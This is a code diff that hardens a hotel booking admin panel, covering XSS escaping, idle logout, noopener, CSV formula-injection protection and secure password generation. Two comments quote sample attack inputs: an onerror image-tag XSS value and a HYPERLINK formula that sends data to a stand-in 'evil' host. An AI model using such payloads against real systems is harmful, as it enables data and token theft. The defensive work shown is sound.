@@ -628,6 +628,7 @@ async function doLogin() {
     sessionStorage.setItem('admin_auth', '1');
     document.getElementById('loginWrap').style.display = 'none';
     document.getElementById('app').style.display = 'flex';
+    resetIdleTimer();
     loadAll({silent:true});
   } catch(e) {
     errEl.textContent = 'Ошибка соединения';
@@ -645,10 +646,49 @@ function doLogout() {
   location.reload();
 }
 
+// ══════════════════════════════════════════════════════
+// АВТОВЫХОД ПО БЕЗДЕЙСТВИЮ
+// ══════════════════════════════════════════════════════
+// Сессия жила, пока открыта вкладка. Админка показывает персональные данные
+// гостей — ФИО, телефоны, почту, суммы. Оставленный без присмотра ноутбук
+// или чужой компьютер означали полный доступ к ним на неограниченное время.
+//
+// 30 минут без действий — выход. За минуту до этого предупреждаем:
+// молча выкидывать посреди работы хуже, чем не выкидывать вовсе.
+const IDLE_LIMIT_MS = 30 * 60 * 1000;
+let _idleTimer = null, _idleWarnTimer = null;
+
+function resetIdleTimer() {
+  clearTimeout(_idleTimer); clearTimeout(_idleWarnTimer);
+  if (!sessionStorage.getItem('admin_auth')) return;
+  _idleWarnTimer = setTimeout(function(){
+    showToast('Сессия закроется через минуту без действий', true);
+  }, IDLE_LIMIT_MS - 60000);
+  _idleTimer = setTimeout(function(){
+    sessionStorage.removeItem('admin_auth');
+    sessionStorage.removeItem('admin_token');
+    adminToken = '';
+    alert('Сессия завершена из-за бездействия. Войдите заново.');
+    location.reload();
+  }, IDLE_LIMIT_MS);
+}
+['click','keydown','mousemove','touchstart','scroll'].forEach(function(ev){
+  document.addEventListener(ev, function(){
+    // Не перезапускаем таймер на каждое движение мыши — только раз в 30 секунд,
+    // иначе на каждое событие уходил бы вызов clearTimeout/setTimeout.
+    const now = Date.now();
+    if (!resetIdleTimer._last || now - resetIdleTimer._last > 30000) {
+      resetIdleTimer._last = now;
+      resetIdleTimer();
+    }
+  }, { passive: true });
+});
+
 // Check auth on load
 if (sessionStorage.getItem('admin_auth')) {
   document.getElementById('loginWrap').style.display = 'none';
   document.getElementById('app').style.display = 'flex';
+  resetIdleTimer();
   loadAll({silent:true});
 }
 
@@ -748,7 +788,7 @@ async function loadCities(){
     const rows=await r.json();
     const sel=document.getElementById('no-city');
     if(sel && Array.isArray(rows)){
-      sel.innerHTML='<option value="">— выберите —</option>'+rows.map(c=>`<option value="${c.id}">${String(c.name_ru||c.name_en||'').replace(/[<>&"]/g,'')}</option>`).join('');
+      sel.innerHTML='<option value="">— выберите —</option>'+rows.map(c=>`<option value="${esc(c.id)}">${esc(c.name_ru||c.name_en||'')}</option>`).join('');
     }
   }catch(e){ /* необязательно */ }
 }
@@ -763,11 +803,18 @@ async function loadModeration(){
     const nb=document.getElementById('nb-moder'); if(nb)nb.textContent=moderList.length;
     if(!moderList.length){ box.innerHTML='<p style="color:var(--muted);padding:20px;text-align:center">Нет объектов на модерации</p>'; return; }
     box.innerHTML='<table style="width:100%;border-collapse:collapse"><thead><tr style="text-align:left;font-size:11px;text-transform:uppercase;color:var(--muted)"><th style="padding:10px">Объект</th><th>Контакты</th><th>Подтверждён</th><th>Действия</th></tr></thead><tbody>'+
+      // ═ БЕЗОПАСНОСТЬ ═ Все поля через esc(), включая phone и email.
+      // Раньше телефон и email вставлялись СЫРЫМИ, а name_ru/address экранировали
+      // только «<», пропуская кавычки и «&». Данные сюда приходят из ПУБЛИЧНОЙ формы
+      // подтверждения объекта, то есть их задаёт посторонний человек.
+      // Телефон вида <img src=x onerror=...> выполнялся бы в админке при открытии
+      // страницы модерации — с доступом к токену администратора.
+      // h.id тоже экранируем: он подставляется внутрь onclick, то есть в код.
       moderList.map(h=>`<tr style="border-top:1px solid var(--border)">
-        <td style="padding:12px 10px"><b>${(h.name_ru||'').replace(/</g,'&lt;')}</b><br><span style="font-size:12px;color:var(--muted)">${(h.address||'').replace(/</g,'&lt;')}</span></td>
-        <td style="font-size:12px;color:var(--muted)">${(h.phone||'')} ${(h.email||'')}</td>
-        <td style="font-size:12px;color:var(--muted)">${h.claimed_at?new Date(h.claimed_at).toLocaleDateString('ru'):'—'}</td>
-        <td style="white-space:nowrap"><button onclick="approveModeration('${h.id}')" style="background:var(--green);color:#fff;border:none;border-radius:8px;padding:8px 14px;font-size:12px;font-weight:700;cursor:pointer;font-family:inherit;margin-right:6px">✓ Одобрить</button><button onclick="rejectModeration('${h.id}')" style="background:#fdecec;color:#dc2626;border:none;border-radius:8px;padding:8px 12px;font-size:12px;font-weight:700;cursor:pointer;font-family:inherit">Отклонить</button></td>
+        <td style="padding:12px 10px"><b>${esc(h.name_ru||'')}</b><br><span style="font-size:12px;color:var(--muted)">${esc(h.address||'')}</span></td>
+        <td style="font-size:12px;color:var(--muted)">${esc(h.phone||'')} ${esc(h.email||'')}</td>
+        <td style="font-size:12px;color:var(--muted)">${h.claimed_at?esc(new Date(h.claimed_at).toLocaleDateString('ru')):'—'}</td>
+        <td style="white-space:nowrap"><button onclick="approveModeration('${escAttr(h.id)}')" style="background:var(--green);color:#fff;border:none;border-radius:8px;padding:8px 14px;font-size:12px;font-weight:700;cursor:pointer;font-family:inherit;margin-right:6px">✓ Одобрить</button><button onclick="rejectModeration('${escAttr(h.id)}')" style="background:#fdecec;color:#dc2626;border:none;border-radius:8px;padding:8px 12px;font-size:12px;font-weight:700;cursor:pointer;font-family:inherit">Отклонить</button></td>
       </tr>`).join('')+'</tbody></table>';
   }catch(e){ box.innerHTML='<p style="color:#dc2626;padding:20px">Ошибка загрузки</p>'; }
 }
@@ -1038,21 +1085,21 @@ function renderHotelsTable(hotels) {
         <tr>
           <td><b>${esc(h.name_ru||'—')}</b></td>
           <td>${esc(h.city_ru||'—')}</td>
-          <td>${h.category||'—'}</td>
-          <td>${h.stars ? '★'.repeat(h.stars) : '—'}</td>
-          <td>${h.rating||'—'}</td>
-          <td style="font-size:11px;color:var(--muted)">${h.ostrovok_hid||'—'}</td>
+          <td>${esc(h.category||'—')}</td>
+          <td>${h.stars ? '★'.repeat(Math.min(Number(h.stars)||0, 5)) : '—'}</td>
+          <td>${esc(h.rating||'—')}</td>
+          <td style="font-size:11px;color:var(--muted)">${esc(h.ostrovok_hid||'—')}</td>
           <td>${objStatusBadge(h.status || (h.is_active?'active':'paused'))}</td>
           <td style="display:flex;gap:4px;flex-wrap:wrap;align-items:center">
             ${currentHotelSource==='ostrovok' ? `
               <span style="font-size:11px;color:var(--muted)">справочник</span>
-              <button class="act-btn" onclick="setHotelStatus('${h.id}','${h.is_active?'paused':'active'}')" style="background:${h.is_active?'var(--red-dim)':'var(--lime-dim)'};color:${h.is_active?'#dc2626':'var(--green)'}">${h.is_active?'Скрыть из поиска':'Показать'}</button>
+              <button class="act-btn" onclick="setHotelStatus('${escAttr(h.id)}','${h.is_active?'paused':'active'}')" style="background:${h.is_active?'var(--red-dim)':'var(--lime-dim)'};color:${h.is_active?'#dc2626':'var(--green)'}">${h.is_active?'Скрыть из поиска':'Показать'}</button>
             ` : `
-              <select onchange="setHotelStatus('${h.id}',this.value)" style="padding:6px 8px;border:1.5px solid var(--faint);border-radius:8px;font-size:12px;font-family:inherit;background:#fff">
+              <select onchange="setHotelStatus('${escAttr(h.id)}',this.value)" style="padding:6px 8px;border:1.5px solid var(--faint);border-radius:8px;font-size:12px;font-family:inherit;background:#fff">
                 ${['application','moderation','approved','active','paused'].map(s=>`<option value="${s}"${(h.status||(h.is_active?'active':'paused'))===s?' selected':''}>${objStatusLabel(s)}</option>`).join('')}
               </select>
-              <button class="act-btn act-approve" onclick="editHotel('${h.id}')">✏️</button>
-              <button class="act-btn" onclick="adminEditCalendar('${h.id}')" style="background:var(--lime-dim);color:var(--green)">⚙️ Управление</button>
+              <button class="act-btn act-approve" onclick="editHotel('${escAttr(h.id)}')">✏️</button>
+              <button class="act-btn" onclick="adminEditCalendar('${escAttr(h.id)}')" style="background:var(--lime-dim);color:var(--green)">⚙️ Управление</button>
             `}
           </td>
         </tr>`).join('')}
@@ -1077,7 +1124,11 @@ async function adminEditCalendar(id){
     const r=await fetch(`${API}/api/users/impersonate/${id}`,{method:'POST',headers:authHeaders()});
     const d=await r.json();
     if(r.ok && d.token){
-      window.open('https://hotel.zaedem.by/?token='+encodeURIComponent(d.token),'_blank');
+      // noopener: без него открытая вкладка получает window.opener и может
+      // ПЕРЕНАПРАВИТЬ админку на поддельную страницу входа, пока админ смотрит
+      // в другую вкладку (reverse tabnabbing). Ссылка одноразовая и наша,
+      // но полагаться на это незачем.
+      window.open('https://hotel.zaedem.by/?token='+encodeURIComponent(d.token),'_blank','noopener,noreferrer');
     } else {
       showToast(d.error||'Не удалось войти (нет владельца?)', true);
       editHotel(id); // запасной вариант — правка в админке
@@ -1110,7 +1161,7 @@ function editHotel(id) {
       <div><label style="font-size:11px;font-weight:700;color:var(--muted);display:block;margin-bottom:4px">Email</label>
         <input id="eh-email" value="${esc(h.email||'')}" style="width:100%;padding:8px 10px;border:1.5px solid var(--border);border-radius:8px;font-size:13px;outline:none"></div>
       <div><label style="font-size:11px;font-weight:700;color:var(--muted);display:block;margin-bottom:4px">Ostrovok HID</label>
-        <input id="eh-hid" value="${h.ostrovok_hid||''}" placeholder="например: 8473727" style="width:100%;padding:8px 10px;border:1.5px solid var(--border);border-radius:8px;font-size:13px;outline:none"></div>
+        <input id="eh-hid" value="${esc(h.ostrovok_hid||'')}" placeholder="например: 8473727" style="width:100%;padding:8px 10px;border:1.5px solid var(--border);border-radius:8px;font-size:13px;outline:none"></div>
       <div><label style="font-size:11px;font-weight:700;color:var(--muted);display:block;margin-bottom:4px">Описание</label>
         <textarea id="eh-desc" rows="3" style="width:100%;padding:8px 10px;border:1.5px solid var(--border);border-radius:8px;font-size:13px;outline:none;resize:vertical">${esc(h.description_ru||'')}</textarea></div>
     </div>`;
@@ -1196,7 +1247,7 @@ function renderDashboard() {
     <table>
       <tr><th>Бронь</th><th>Гость</th><th>Отель</th><th>Даты</th><th>Сумма</th><th>Статус</th></tr>
       ${last5.map(b => `
-        <tr onclick="showBooking('${b.id}')" style="cursor:pointer">
+        <tr onclick="showBooking('${escAttr(b.id)}')" style="cursor:pointer">
           <td><b>${esc(b.booking_num)}</b></td>
           <td>${esc(b.guest_name||'—')}<br><span style="color:var(--muted);font-size:10px">${esc(b.guest_email)}</span></td>
           <td>${esc(b.hotel_name||'—')}</td>
@@ -1218,8 +1269,8 @@ function renderDashboard() {
           <td>${esc(a.contact_name||'—')}</td>
           <td>${esc(a.email)}</td>
           <td>
-            <button class="act-btn act-approve" onclick="approveApp('${a.id}','${escAttr(a.email)}','${escAttr(a.contact_name||'')}','${escAttr(a.hotel_name)}')">✓ Одобрить</button>
-            <button class="act-btn act-reject" onclick="rejectApp('${a.id}')" style="margin-left:4px">✗ Отклонить</button>
+            <button class="act-btn act-approve" onclick="approveApp('${escAttr(a.id)}','${escAttr(a.email)}','${escAttr(a.contact_name||'')}','${escAttr(a.hotel_name)}')">✓ Одобрить</button>
+            <button class="act-btn act-reject" onclick="rejectApp('${escAttr(a.id)}')" style="margin-left:4px">✗ Отклонить</button>
           </td>
         </tr>`).join('')}
     </table>` : '<div class="empty">Новых заявок нет</div>';
@@ -1528,7 +1579,7 @@ function renderJournal(d) {
         <td><b>${esc(EVENT_LBL[e.event] || e.event)}</b>${e.note?`<br><span style="color:var(--muted);font-size:10px">${esc(e.note)}</span>`:''}</td>
         <td>${fmtTs(e.event_at)}</td>
         <td class="jr-mono">${esc(e.recipient||'—')}</td>
-        <td>${e.status_code==null?'—':(e.status_code>=200&&e.status_code<300?'<span class="badge badge-green">'+e.status_code+'</span>':'<span class="badge badge-red">'+e.status_code+'</span>')}</td>
+        <td>${e.status_code==null?'—':(e.status_code>=200&&e.status_code<300?'<span class="badge badge-green">'+esc(e.status_code)+'</span>':'<span class="badge badge-red">'+esc(e.status_code)+'</span>')}</td>
         <td class="jr-mono">${esc(e.ip||'—')}</td>
       </tr>`).join('')}
     </table>` : '<div class="jr-none">Событий не записано</div>';
@@ -1685,11 +1736,11 @@ function renderBookingsTable(bookings) {
           <td>${esc(b.hotel_name||'—')}</td>
           <td>${fmtDate(b.check_in)}</td>
           <td>${fmtDate(b.check_out)}</td>
-          <td>${b.nights||1}</td>
+          <td>${esc(b.nights||1)}</td>
           <td><b>${parseFloat(b.total_price||0).toFixed(0)} BYN</b></td>
           <td>${statusBadge(b.status)}</td>
           <td style="display:flex;gap:4px">
-            <button class="act-btn act-approve" onclick="showBooking('${b.id}')">Детали</button>
+            <button class="act-btn act-approve" onclick="showBooking('${escAttr(b.id)}')">Детали</button>
             <button class="act-btn" onclick="showJournal('${escAttr(b.booking_num)}')" style="background:var(--blue-dim);color:var(--blue)" title="Согласия, журнал передачи данных, ответы поставщика">Журнал</button>
             ${b.status!=='cancelled'?`<button class="act-btn" onclick="adminCancelBooking('${escAttr(b.booking_num)}')" style="background:var(--red-dim);color:var(--red)">✗</button>`:''}
           </td>
@@ -1697,7 +1748,21 @@ function renderBookingsTable(bookings) {
     </table>` : emptyBox((allBookings||[]).length, 'resetBookingFilters()', 'Броней пока нет');
 }
 
-// ── ЭКСПОРТ CSV (для бухгалтерии ИП) ──
+// ═ БЕЗОПАСНОСТЬ ═ Защита от инъекции формул в CSV.
+// Excel и LibreOffice выполняют содержимое ячейки, начинающейся с = + - @
+// или управляющих символов. Имя гостя вида
+//   =HYPERLINK("http://evil/?x="&A1;"Нажмите")
+// превратилось бы в рабочую формулу, когда бухгалтер откроет выгрузку.
+// Данные сюда приходят от гостей и из системы поставщика, то есть извне.
+// Ставим апостроф перед опасным первым символом — Excel трактует такую
+// ячейку как текст, а на глаз выгрузка не меняется.
+function csvCell(v) {
+  let s = String(v == null ? '' : v);
+  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
+  return '"' + s.replace(/"/g, '""') + '"';
+}
+
+// ── ЭКСПОРТ CSV (для бухгалтерии) ──
 function exportBookingsCSV() {
   const list = filterBookingList();
   const headers = ['Номер брони','Источник','Гость','Email','Телефон','Отель','Номер','Заезд','Выезд','Ночей','Гостей','Сумма BYN','Статус','Создано'];
@@ -1709,8 +1774,8 @@ function exportBookingsCSV() {
     parseFloat(b.total_price||0).toFixed(2), b.status||'', (b.created_at||'').slice(0,10)
   ]);
   const csv = [headers, ...rows].map(r =>
-    r.map(c => '"' + String(c).replace(/"/g,'""') + '"').join(',')
-  ).join('\n');
+    r.map(csvCell).join(',')
+  ).join('\r\n');
   const blob = new Blob(['\ufeff' + csv], {type:'text/csv;charset=utf-8'});
   const url = URL.createObjectURL(blob);
   const a = document.createElement('a');
@@ -1755,7 +1820,7 @@ function renderAppsTable(apps, filter = 'all') {
         <tr>
           <td><b>${esc(a.hotel_name)}</b></td>
           <td>${esc(a.city||'—')}</td>
-          <td>${a.rooms_count||'—'}</td>
+          <td>${esc(a.rooms_count||'—')}</td>
           <td>${esc(a.contact_name||'—')}</td>
           <td>${esc(a.email)}</td>
           <td>${esc(a.phone)}</td>
@@ -1763,8 +1828,8 @@ function renderAppsTable(apps, filter = 'all') {
           <td>${appStatusBadge(a.status)}</td>
           <td>
             ${a.status === 'new' ? `
-              <button class="act-btn act-approve" onclick="approveApp('${a.id}','${escAttr(a.email)}','${escAttr(a.contact_name||'')}','${escAttr(a.hotel_name)}')">✓ Одобрить</button>
-              <button class="act-btn act-reject" onclick="rejectApp('${a.id}')" style="margin-left:4px">✗</button>
+              <button class="act-btn act-approve" onclick="approveApp('${escAttr(a.id)}','${escAttr(a.email)}','${escAttr(a.contact_name||'')}','${escAttr(a.hotel_name)}')">✓ Одобрить</button>
+              <button class="act-btn act-reject" onclick="rejectApp('${escAttr(a.id)}')" style="margin-left:4px">✗</button>
             ` : '—'}
           </td>
         </tr>`).join('')}
@@ -1826,11 +1891,11 @@ function renderTouristsTable(users) {
           <td>${fmtDate(u.created_at)}</td>
           <td>${u.is_active ? '<span class="badge badge-green">Активен</span>' : '<span class="badge badge-red">Заблокирован</span>'}</td>
           <td style="white-space:nowrap">
-            <button class="act-btn" onclick="resetUserPassword('${u.id}','${escAttr(u.email)}')"
+            <button class="act-btn" onclick="resetUserPassword('${escAttr(u.id)}','${escAttr(u.email)}')"
               style="background:var(--blue-dim,#eff6ff);color:var(--blue,#2563eb);margin-right:4px">
               🔑 Пароль
             </button>
-            <button class="act-btn" onclick="toggleUser('${u.id}',${!u.is_active})"
+            <button class="act-btn" onclick="toggleUser('${escAttr(u.id)}',${!u.is_active})"
               style="background:${u.is_active?'var(--red-dim)':'var(--lime-dim)'};color:${u.is_active?'var(--red)':'var(--green)'}">
               ${u.is_active?'🚫 Блок':'✓ Разблок'}
             </button>
@@ -1931,8 +1996,8 @@ function showBooking(id) {
     <div class="detail-row"><b>Номер:</b> ${esc(b.room_name||'—')}</div>
     <div class="detail-row"><b>Заезд:</b> ${fmtDate(b.check_in)}</div>
     <div class="detail-row"><b>Выезд:</b> ${fmtDate(b.check_out)}</div>
-    <div class="detail-row"><b>Ночей:</b> ${b.nights||1}</div>
-    <div class="detail-row"><b>Гостей:</b> ${b.guests_count||1}</div>
+    <div class="detail-row"><b>Ночей:</b> ${esc(b.nights||1)}</div>
+    <div class="detail-row"><b>Гостей:</b> ${esc(b.guests_count||1)}</div>
     <div class="detail-row"><b>Сумма:</b> ${parseFloat(b.total_price||0).toFixed(2)} ${esc(b.currency||'BYN')}</div>
     <div class="detail-row"><b>Статус:</b> ${statusBadge(b.status)}</div>
     <div class="detail-row"><b>Создана:</b> ${fmtDate(b.created_at)}</div>
@@ -1992,9 +2057,28 @@ function appStatusBadge(s) {
   return `<span class="badge ${map[s]||'badge-gray'}">${labels[s]||s}</span>`;
 }
 
-function generatePassword() {
+// ═ БЕЗОПАСНОСТЬ ═ Пароли генерируются криптостойким источником.
+// Раньше здесь был Math.random(): он не предназначен для секретов —
+// его выдача предсказуема при знании внутреннего состояния, а состояние
+// восстанавливается по нескольким полученным значениям. Для паролей,
+// которые выдаются партнёрам, это негодный источник.
+//
+// Отбрасывание остатка (rejection sampling) вместо взятия по модулю:
+// простой % даёт перекос в сторону первых символов алфавита и режет энтропию.
+function generatePassword(len) {
   const chars = 'ABCDEFGHJKMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789!@#';
-  return Array.from({length:12}, () => chars[Math.floor(Math.random()*chars.length)]).join('');
+  const n = len || 16;
+  const out = [];
+  const max = 256 - (256 % chars.length);   // граница, выше которой байт отбрасываем
+  const buf = new Uint8Array(64);
+  while (out.length < n) {
+    (crypto && crypto.getRandomValues) ? crypto.getRandomValues(buf)
+      : (() => { throw new Error('Нет источника случайных чисел'); })();
+    for (let i = 0; i < buf.length && out.length < n; i++) {
+      if (buf[i] < max) out.push(chars[buf[i] % chars.length]);
+    }
+  }
+  return out.join('');
 }
 
 function openModal() { document.getElementById('modal').classList.add('open'); }
